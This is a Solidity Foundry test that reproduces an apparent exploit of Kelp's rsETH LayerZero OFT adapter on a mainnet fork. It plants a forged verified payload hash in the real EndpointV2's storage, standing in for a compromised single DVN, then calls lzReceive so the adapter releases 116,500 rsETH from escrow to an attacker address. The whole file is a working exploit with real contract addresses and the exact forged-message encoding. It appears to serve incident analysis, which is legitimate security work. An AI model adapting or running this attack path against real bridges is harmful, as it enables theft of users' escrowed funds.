// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {stdStorage, StdStorage} from "forge-std/StdStorage.sol";
import {IERC20} from "../src/Interfaces.sol";

struct Origin {
    uint32 srcEid;
    bytes32 sender;
    uint64 nonce;
}

/// LayerZero V2 EndpointV2 (subset).
interface ILZEndpointV2 {
    function lzReceive(
        Origin calldata _origin,
        address _receiver,
        bytes32 _guid,
        bytes calldata _message,
        bytes calldata _extraData
    ) external payable;

    function lazyInboundNonce(address receiver, uint32 srcEid, bytes32 sender) external view returns (uint64);
    function inboundPayloadHash(address receiver, uint32 srcEid, bytes32 sender, uint64 nonce)
        external
        view
        returns (bytes32);
}

interface IKelpOFTAdapter {
    function peers(uint32 eid) external view returns (bytes32);
    function decimalConversionRate() external view returns (uint256);
}

/// @notice LEVEL B: the most faithful reproduction of the delivery path.
/// Instead of impersonating the adapter's caller, we go through the REAL
/// `EndpointV2.lzReceive`. We plant the verified `inboundPayloadHash` in endpoint
/// storage (which in the real incident the poisoned 1-of-1 DVN did via `verify`),
/// then call the endpoint exactly as an executor would. The endpoint runs its own
/// nonce accounting and payload-hash check, then dispatches to the real adapter,
/// which releases rsETH from escrow. No cheatcode touches the adapter or the token.
contract KelpEndpointForgeTest is Test {
    using stdStorage for StdStorage;

    address constant OFT_ADAPTER = 0x85d456B2DfF1fd8245387C0BfB64Dfb700e98Ef3;
    address constant LZ_ENDPOINT = 0x1a44076050125825900e736c501f859c50fE728c;
    address constant rsETH       = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    uint32  constant SRC_EID     = 30110; // Arbitrum One
    uint256 constant STOLEN      = 116_500 ether;

    address attacker = makeAddr("lazarus");

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 24_900_000);
    }

    function test_EndpointVerifiedForgedDelivery() public {
        console2.log("==================================================================");
        console2.log(" Kelp exploit - REAL EndpointV2.lzReceive() forged delivery (Level B)");
        console2.log("==================================================================");

        bytes32 peer = IKelpOFTAdapter(OFT_ADAPTER).peers(SRC_EID);
        uint256 convRate = IKelpOFTAdapter(OFT_ADAPTER).decimalConversionRate();
        uint64 amountSD = uint64(STOLEN / convRate);

        // The forged OFT message and its LayerZero packet payload.
        bytes memory message = abi.encodePacked(bytes32(uint256(uint160(attacker))), amountSD);
        bytes32 guid = keccak256("lazarus-forged-packet");
        bytes memory payload = abi.encodePacked(guid, message); // == what _clearPayload hashes
        bytes32 payloadHash = keccak256(payload);

        // Endpoint requires nonce == lazyInboundNonce + 1 with a matching verified hash.
        uint64 lazy = ILZEndpointV2(LZ_ENDPOINT).lazyInboundNonce(OFT_ADAPTER, SRC_EID, peer);
        uint64 nonce = lazy + 1;
        console2.log("endpoint lazyInboundNonce (real) = %s", lazy);
        console2.log("forged nonce                     = %s", nonce);

        // === This SSTORE is what the compromised 1-of-1 DVN accomplished via verify() ===
        stdstore
            .target(LZ_ENDPOINT)
            .sig("inboundPayloadHash(address,uint32,bytes32,uint64)")
            .with_key(OFT_ADAPTER)
            .with_key(uint256(SRC_EID))
            .with_key(peer)
            .with_key(uint256(nonce))
            .checked_write(payloadHash);

        assertEq(
            ILZEndpointV2(LZ_ENDPOINT).inboundPayloadHash(OFT_ADAPTER, SRC_EID, peer, nonce),
            payloadHash,
            "payload must be marked verified in endpoint storage"
        );
        console2.log("planted inboundPayloadHash -> message now counts as DVN-verified");

        uint256 escrowBefore = IERC20(rsETH).balanceOf(OFT_ADAPTER);

        // === Call the REAL endpoint, exactly as an executor would ===
        Origin memory origin = Origin({srcEid: SRC_EID, sender: peer, nonce: nonce});
        ILZEndpointV2(LZ_ENDPOINT).lzReceive(origin, OFT_ADAPTER, guid, message, "");

        uint256 escrowAfter = IERC20(rsETH).balanceOf(OFT_ADAPTER);

        console2.log("");
        console2.log("[through EndpointV2 -> adapter.lzReceive -> escrow release]");
        console2.log("  adapter escrow BEFORE = %s rsETH", escrowBefore / 1e18);
        console2.log("  attacker received     = %s rsETH", IERC20(rsETH).balanceOf(attacker) / 1e18);
        console2.log("  adapter escrow AFTER  = %s rsETH", escrowAfter / 1e18);

        // endpoint should have consumed the nonce and cleared the payload hash
        console2.log("  lazyInboundNonce now  = %s (consumed)", ILZEndpointV2(LZ_ENDPOINT).lazyInboundNonce(OFT_ADAPTER, SRC_EID, peer));
        assertEq(IERC20(rsETH).balanceOf(attacker), STOLEN, "adapter must release forged amount via endpoint");
        assertEq(escrowBefore - escrowAfter, STOLEN);
        assertEq(ILZEndpointV2(LZ_ENDPOINT).inboundPayloadHash(OFT_ADAPTER, SRC_EID, peer, nonce), bytes32(0), "payload cleared");
    }
}
